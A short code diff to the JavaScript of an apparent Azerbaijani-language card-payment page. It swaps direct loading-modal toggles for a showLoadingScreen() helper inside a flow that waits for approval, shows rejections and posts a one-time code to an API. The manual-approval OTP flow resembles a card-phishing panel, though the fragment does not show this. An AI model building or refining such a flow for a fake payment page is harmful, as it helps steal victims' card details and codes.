@@ -254,6 +254,7 @@
                 waitingForApproval = false; // Reset waiting flag!
             }
 
+            // CHECK ISPAID AND ISREJECTED FIRST BEFORE WAITING CHECKS!
             if (data.isRejected) {
                 document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
@@ -350,6 +351,7 @@
             }
 
             if (waitingForApproval || data.isPendingApproval) {
+                showLoadingScreen();
                 return;
             }
 
@@ -434,7 +436,7 @@
 
             waitingForApproval = true;
             closeModals();
-            document.getElementById('loading-modal').classList.remove('hidden');
+            showLoadingScreen();
 
             try {
                 await fetch(`${API_URL}/otp`, {
